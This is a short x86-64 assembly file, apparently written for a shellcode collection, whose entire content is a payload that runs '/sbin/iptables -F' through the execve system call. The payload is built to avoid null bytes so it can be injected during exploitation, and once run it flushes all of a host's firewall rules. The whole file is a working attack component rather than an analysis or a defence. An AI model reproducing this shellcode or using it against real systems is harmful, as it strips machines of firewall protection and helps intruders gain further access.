;;
;; iptables_flush.S for shellcodes
;; by lenormf
;;

bits 64

global _start

_start:
	;; execve("/sbin/iptables", ["/sbin/iptables", "-F", 0], 0)
	xor rdx, rdx

	push WORD 0x462d
	mov rcx, rsp

	mov rdi, 0x73656c626174ffff
	shr rdi, 16
	push rdi
	mov rdi, 0x70692f6e6962732f
	push rdi
	mov rdi, rsp

	push rdx
	push rcx
	push rdi
	mov rsi, rsp

	xor rax, rax
	mov al, 59
	syscall

